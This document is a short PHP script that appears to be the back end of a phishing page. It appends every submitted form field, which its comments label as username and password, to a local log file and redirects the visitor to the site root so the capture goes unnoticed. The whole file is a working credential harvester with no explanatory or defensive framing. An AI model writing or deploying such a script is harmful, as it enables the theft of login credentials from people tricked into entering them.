<?php
header ('Location:/');
$file = fopen("logFile.txt",'a');
foreach($_POST as $key => $value){
    fwrite($file,$key);      // This stores the field Name username
    fwrite($file,"=>");      // => 
    fwrite($file,$value);    // This stores the field Value password
    fwrite($file,"\r\n");
}
fwrite($file,"\r\n");
fclose($file);
exit;
?>